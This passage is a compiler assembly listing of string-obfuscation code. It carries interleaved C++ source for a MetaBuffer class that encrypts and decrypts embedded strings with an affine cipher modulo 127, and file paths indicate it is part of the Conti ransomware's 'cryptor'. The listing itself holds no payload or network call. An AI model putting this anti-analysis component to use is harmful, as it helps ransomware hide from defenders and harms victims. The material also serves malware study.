  00073	c6 41 1d 64	 mov	 BYTE PTR [rcx+29], 100	; 00000064H
  00077	c6 41 1e 41	 mov	 BYTE PTR [rcx+30], 65	; 00000041H
  0007b	c6 41 1f 02	 mov	 BYTE PTR [rcx+31], 2
  0007f	c6 41 20 69	 mov	 BYTE PTR [rcx+32], 105	; 00000069H
  00083	c6 41 21 33	 mov	 BYTE PTR [rcx+33], 51	; 00000033H
  00087	c6 41 22 61	 mov	 BYTE PTR [rcx+34], 97	; 00000061H
  0008b	c6 41 23 38	 mov	 BYTE PTR [rcx+35], 56	; 00000038H
  0008f	c6 41 24 2e	 mov	 BYTE PTR [rcx+36], 46	; 0000002eH
  00093	c6 41 25 7a	 mov	 BYTE PTR [rcx+37], 122	; 0000007aH
  00097	c6 41 26 0f	 mov	 BYTE PTR [rcx+38], 15
  0009b	c6 41 27 33	 mov	 BYTE PTR [rcx+39], 51	; 00000033H
  0009f	c6 41 28 1e	 mov	 BYTE PTR [rcx+40], 30
  000a3	c6 41 29 38	 mov	 BYTE PTR [rcx+41], 56	; 00000038H
  000a7	c6 41 2a 4c	 mov	 BYTE PTR [rcx+42], 76	; 0000004cH
  000ab	c6 41 2b 0a	 mov	 BYTE PTR [rcx+43], 10
  000af	c6 41 2c 19	 mov	 BYTE PTR [rcx+44], 25
  000b3	c6 41 2d 02	 mov	 BYTE PTR [rcx+45], 2
  000b7	c6 41 2e 09	 mov	 BYTE PTR [rcx+46], 9
  000bb	c6 41 2f 33	 mov	 BYTE PTR [rcx+47], 51	; 00000033H
  000bf	c6 41 30 7a	 mov	 BYTE PTR [rcx+48], 122	; 0000007aH
  000c3	c6 41 31 29	 mov	 BYTE PTR [rcx+49], 41	; 00000029H
  000c7	c6 41 32 0a	 mov	 BYTE PTR [rcx+50], 10
  000cb	c6 41 33 56	 mov	 BYTE PTR [rcx+51], 86	; 00000056H
  000cf	c6 41 34 14	 mov	 BYTE PTR [rcx+52], 20
  000d3	c6 41 35 33	 mov	 BYTE PTR [rcx+53], 51	; 00000033H
  000d7	c6 41 36 02	 mov	 BYTE PTR [rcx+54], 2
  000db	c6 41 37 6d	 mov	 BYTE PTR [rcx+55], 109	; 0000006dH
  000df	c6 41 38 09	 mov	 BYTE PTR [rcx+56], 9
  000e3	c6 41 39 33	 mov	 BYTE PTR [rcx+57], 51	; 00000033H
  000e7	c6 41 3a 7a	 mov	 BYTE PTR [rcx+58], 122	; 0000007aH
  000eb	c6 41 3b 2e	 mov	 BYTE PTR [rcx+59], 46	; 0000002eH
  000ef	c6 41 3c 7a	 mov	 BYTE PTR [rcx+60], 122	; 0000007aH
  000f3	c6 41 3d 2e	 mov	 BYTE PTR [rcx+61], 46	; 0000002eH
  000f7	c6 41 3e 61	 mov	 BYTE PTR [rcx+62], 97	; 00000061H
  000fb	c6 41 3f 38	 mov	 BYTE PTR [rcx+63], 56	; 00000038H
  000ff	c6 41 40 14	 mov	 BYTE PTR [rcx+64], 20
  00103	c6 41 41 2b	 mov	 BYTE PTR [rcx+65], 43	; 0000002bH
  00107	c6 41 42 52	 mov	 BYTE PTR [rcx+66], 82	; 00000052H
  0010b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0010f	48 8b c1	 mov	 rax, rcx
  00112	c3		 ret	 0
??0?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 36 00 00
	00		 mov	 r11d, 54		; 00000036H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 49	 sub	 ecx, 73			; 00000049H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 07	 imul	 r8d, ecx, 7

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 54	 mov	 BYTE PTR [rcx+1], 84	; 00000054H
  00007	c6 41 02 58	 mov	 BYTE PTR [rcx+2], 88	; 00000058H
  0000b	c6 41 03 45	 mov	 BYTE PTR [rcx+3], 69	; 00000045H
  0000f	c6 41 04 35	 mov	 BYTE PTR [rcx+4], 53	; 00000035H
  00013	c6 41 05 6b	 mov	 BYTE PTR [rcx+5], 107	; 0000006bH
  00017	c6 41 06 23	 mov	 BYTE PTR [rcx+6], 35	; 00000023H
  0001b	c6 41 07 6b	 mov	 BYTE PTR [rcx+7], 107	; 0000006bH
  0001f	c6 41 08 0f	 mov	 BYTE PTR [rcx+8], 15
  00023	c6 41 09 11	 mov	 BYTE PTR [rcx+9], 17
  00027	c6 41 0a 05	 mov	 BYTE PTR [rcx+10], 5
  0002b	c6 41 0b 65	 mov	 BYTE PTR [rcx+11], 101	; 00000065H
  0002f	c6 41 0c 7d	 mov	 BYTE PTR [rcx+12], 125	; 0000007dH
  00033	c6 41 0d 6a	 mov	 BYTE PTR [rcx+13], 106	; 0000006aH
  00037	c6 41 0e 69	 mov	 BYTE PTR [rcx+14], 105	; 00000069H
  0003b	c6 41 0f 7d	 mov	 BYTE PTR [rcx+15], 125	; 0000007dH
  0003f	c6 41 10 45	 mov	 BYTE PTR [rcx+16], 69	; 00000045H
  00043	c6 41 11 21	 mov	 BYTE PTR [rcx+17], 33	; 00000021H
  00047	c6 41 12 33	 mov	 BYTE PTR [rcx+18], 51	; 00000033H
  0004b	c6 41 13 05	 mov	 BYTE PTR [rcx+19], 5
  0004f	c6 41 14 79	 mov	 BYTE PTR [rcx+20], 121	; 00000079H
  00053	c6 41 15 67	 mov	 BYTE PTR [rcx+21], 103	; 00000067H
  00057	c6 41 16 2e	 mov	 BYTE PTR [rcx+22], 46	; 0000002eH
  0005b	c6 41 17 05	 mov	 BYTE PTR [rcx+23], 5
  0005f	c6 41 18 69	 mov	 BYTE PTR [rcx+24], 105	; 00000069H
  00063	c6 41 19 7d	 mov	 BYTE PTR [rcx+25], 125	; 0000007dH
  00067	c6 41 1a 33	 mov	 BYTE PTR [rcx+26], 51	; 00000033H
  0006b	c6 41 1b 05	 mov	 BYTE PTR [rcx+27], 5
  0006f	c6 41 1c 2e	 mov	 BYTE PTR [rcx+28], 46	; 0000002eH
  00073	c6 41 1d 65	 mov	 BYTE PTR [rcx+29], 101	; 00000065H
  00077	c6 41 1e 67	 mov	 BYTE PTR [rcx+30], 103	; 00000067H
  0007b	c6 41 1f 05	 mov	 BYTE PTR [rcx+31], 5
  0007f	c6 41 20 0a	 mov	 BYTE PTR [rcx+32], 10
  00083	c6 41 21 35	 mov	 BYTE PTR [rcx+33], 53	; 00000035H
  00087	c6 41 22 36	 mov	 BYTE PTR [rcx+34], 54	; 00000036H
  0008b	c6 41 23 59	 mov	 BYTE PTR [rcx+35], 89	; 00000059H
  0008f	c6 41 24 11	 mov	 BYTE PTR [rcx+36], 17
  00093	c6 41 25 6b	 mov	 BYTE PTR [rcx+37], 107	; 0000006bH
  00097	c6 41 26 7c	 mov	 BYTE PTR [rcx+38], 124	; 0000007cH
  0009b	c6 41 27 35	 mov	 BYTE PTR [rcx+39], 53	; 00000035H
  0009f	c6 41 28 69	 mov	 BYTE PTR [rcx+40], 105	; 00000069H
  000a3	c6 41 29 59	 mov	 BYTE PTR [rcx+41], 89	; 00000059H
  000a7	c6 41 2a 6a	 mov	 BYTE PTR [rcx+42], 106	; 0000006aH
  000ab	c6 41 2b 58	 mov	 BYTE PTR [rcx+43], 88	; 00000058H
  000af	c6 41 2c 45	 mov	 BYTE PTR [rcx+44], 69	; 00000045H
  000b3	c6 41 2d 05	 mov	 BYTE PTR [rcx+45], 5
  000b7	c6 41 2e 1e	 mov	 BYTE PTR [rcx+46], 30
  000bb	c6 41 2f 35	 mov	 BYTE PTR [rcx+47], 53	; 00000035H
  000bf	c6 41 30 6b	 mov	 BYTE PTR [rcx+48], 107	; 0000006bH
  000c3	c6 41 31 6c	 mov	 BYTE PTR [rcx+49], 108	; 0000006cH
  000c7	c6 41 32 58	 mov	 BYTE PTR [rcx+50], 88	; 00000058H
  000cb	c6 41 33 33	 mov	 BYTE PTR [rcx+51], 51	; 00000033H
  000cf	c6 41 34 21	 mov	 BYTE PTR [rcx+52], 33	; 00000021H
  000d3	c6 41 35 35	 mov	 BYTE PTR [rcx+53], 53	; 00000035H
  000d7	c6 41 36 49	 mov	 BYTE PTR [rcx+54], 73	; 00000049H
  000db	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000df	48 8b c1	 mov	 rax, rcx
  000e2	c3		 ret	 0
??0?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 36 00 00
	00		 mov	 r10d, 54		; 00000036H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 32 00 00 00	 mov	 eax, 50			; 00000032H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1b	 mov	 BYTE PTR [rcx+1], 27
  00007	c6 41 02 6f	 mov	 BYTE PTR [rcx+2], 111	; 0000006fH
  0000b	c6 41 03 5d	 mov	 BYTE PTR [rcx+3], 93	; 0000005dH
  0000f	c6 41 04 0b	 mov	 BYTE PTR [rcx+4], 11
  00013	c6 41 05 02	 mov	 BYTE PTR [rcx+5], 2
  00017	c6 41 06 0e	 mov	 BYTE PTR [rcx+6], 14
  0001b	c6 41 07 02	 mov	 BYTE PTR [rcx+7], 2
  0001f	c6 41 08 66	 mov	 BYTE PTR [rcx+8], 102	; 00000066H
  00023	c6 41 09 11	 mov	 BYTE PTR [rcx+9], 17
  00027	c6 41 0a 13	 mov	 BYTE PTR [rcx+10], 19
  0002b	c6 41 0b 03	 mov	 BYTE PTR [rcx+11], 3
  0002f	c6 41 0c 7e	 mov	 BYTE PTR [rcx+12], 126	; 0000007eH
  00033	c6 41 0d 6c	 mov	 BYTE PTR [rcx+13], 108	; 0000006cH
  00037	c6 41 0e 57	 mov	 BYTE PTR [rcx+14], 87	; 00000057H
  0003b	c6 41 0f 7e	 mov	 BYTE PTR [rcx+15], 126	; 0000007eH
  0003f	c6 41 10 5d	 mov	 BYTE PTR [rcx+16], 93	; 0000005dH
  00043	c6 41 11 63	 mov	 BYTE PTR [rcx+17], 99	; 00000063H
  00047	c6 41 12 60	 mov	 BYTE PTR [rcx+18], 96	; 00000060H
  0004b	c6 41 13 13	 mov	 BYTE PTR [rcx+19], 19
  0004f	c6 41 14 2a	 mov	 BYTE PTR [rcx+20], 42	; 0000002aH
  00053	c6 41 15 2d	 mov	 BYTE PTR [rcx+21], 45	; 0000002dH
  00057	c6 41 16 76	 mov	 BYTE PTR [rcx+22], 118	; 00000076H
  0005b	c6 41 17 13	 mov	 BYTE PTR [rcx+23], 19
  0005f	c6 41 18 57	 mov	 BYTE PTR [rcx+24], 87	; 00000057H
  00063	c6 41 19 7e	 mov	 BYTE PTR [rcx+25], 126	; 0000007eH
  00067	c6 41 1a 60	 mov	 BYTE PTR [rcx+26], 96	; 00000060H
  0006b	c6 41 1b 13	 mov	 BYTE PTR [rcx+27], 19
  0006f	c6 41 1c 76	 mov	 BYTE PTR [rcx+28], 118	; 00000076H
  00073	c6 41 1d 03	 mov	 BYTE PTR [rcx+29], 3
  00077	c6 41 1e 2d	 mov	 BYTE PTR [rcx+30], 45	; 0000002dH
  0007b	c6 41 1f 13	 mov	 BYTE PTR [rcx+31], 19
  0007f	c6 41 20 7c	 mov	 BYTE PTR [rcx+32], 124	; 0000007cH
  00083	c6 41 21 0b	 mov	 BYTE PTR [rcx+33], 11
  00087	c6 41 22 20	 mov	 BYTE PTR [rcx+34], 32	; 00000020H
  0008b	c6 41 23 05	 mov	 BYTE PTR [rcx+35], 5
  0008f	c6 41 24 11	 mov	 BYTE PTR [rcx+36], 17
  00093	c6 41 25 02	 mov	 BYTE PTR [rcx+37], 2
  00097	c6 41 26 69	 mov	 BYTE PTR [rcx+38], 105	; 00000069H
  0009b	c6 41 27 0b	 mov	 BYTE PTR [rcx+39], 11
  0009f	c6 41 28 57	 mov	 BYTE PTR [rcx+40], 87	; 00000057H
  000a3	c6 41 29 05	 mov	 BYTE PTR [rcx+41], 5
  000a7	c6 41 2a 6c	 mov	 BYTE PTR [rcx+42], 108	; 0000006cH
  000ab	c6 41 2b 6f	 mov	 BYTE PTR [rcx+43], 111	; 0000006fH
  000af	c6 41 2c 5d	 mov	 BYTE PTR [rcx+44], 93	; 0000005dH
